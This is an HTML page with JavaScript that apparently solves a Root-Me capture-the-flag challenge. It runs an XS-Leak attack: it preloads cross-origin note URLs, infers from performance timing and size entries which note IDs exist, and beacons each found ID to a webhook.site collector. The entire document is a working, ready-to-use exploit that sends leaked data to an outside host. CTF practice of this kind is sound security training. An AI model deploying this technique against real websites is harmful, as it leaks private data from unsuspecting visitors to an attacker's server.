<!DOCTYPE html>
<html>
<head>
    <title>XS-Leak Note Finder</title>
</head>
<body>
    <h1>Checking notes...</h1>
    <div id="status"></div>
    <script>
        const TARGET_BASE = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/';
        const WEBHOOK = 'https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864';   // <-- CHANGE THIS
        const START_ID = 0;
        const END_ID = 1000;
        const DELAY_MS = 200;           // delay between requests
        const SIZE_THRESHOLD = 200;      // bytes; 404 responses are ~45-100 bytes

        let currentId = START_ID;

        function updateStatus(msg) {
            document.getElementById('status').innerHTML += msg + '<br>';
            console.log(msg);
        }

        function reportId(id) {
            const url = `${WEBHOOK}?id=${id}`;
            new Image().src = url;   // send report
            updateStatus(`✅ Found note ID: ${id} → reported to webhook`);
        }

        function checkId(id) {
            return new Promise((resolve) => {
                const url = TARGET_BASE + id;
                const link = document.createElement('link');
                link.rel = 'preload';
                link.as = 'fetch';
                link.href = url;

                // Clean up after load/error
                const cleanup = () => {
                    if (link.parentNode) link.parentNode.removeChild(link);
                };

                link.onload = () => {
                    // Wait a moment for the performance entry to be written
                    setTimeout(() => {
                        const entries = performance.getEntriesByName(url);
                        let size = 0;
                        if (entries.length > 0) {
                            // transferSize is the most accurate, but may be 0 for cross-origin
                            // If so, fallback to encodedBodySize or duration
                            size = entries[0].transferSize || entries[0].encodedBodySize || 0;
                            // If we still have 0, use duration as a proxy (less reliable)
                            if (size === 0 && entries[0].duration) {
                                // Use duration: larger duration = larger response
                                // This is a fallback; you may adjust threshold accordingly
                                const duration = entries[0].duration;
                                if (duration > 50) { // typical 404 might be faster
                                    updateStatus(`ID ${id}: duration ${duration.toFixed(2)}ms (fallback)`);
                                    resolve(true);
                                    cleanup();
                                    return;
                                }
                            }
                        }
                        updateStatus(`ID ${id}: size = ${size} bytes`);
                        resolve(size > SIZE_THRESHOLD);
                        cleanup();
                    }, 50);
                };

                link.onerror = () => {
                    // Network error or resource blocked
                    updateStatus(`ID ${id}: error loading (probably network/CORS)`);
                    resolve(false);
                    cleanup();
                };

                document.head.appendChild(link);
            });
        }

        async function run() {
            updateStatus(`Starting scan from ${START_ID} to ${END_ID}...`);
            for (let id = START_ID; id <= END_ID; id++) {
                const exists = await checkId(id);
                if (exists) {
                    reportId(id);
                    // Optionally stop after first found? Remove this line to continue scanning.
                    break;
                }
                // Wait before next request
                await new Promise(r => setTimeout(r, DELAY_MS));
            }
            updateStatus('Scan complete.');
        }

        run();
    </script>
</body>
</html>
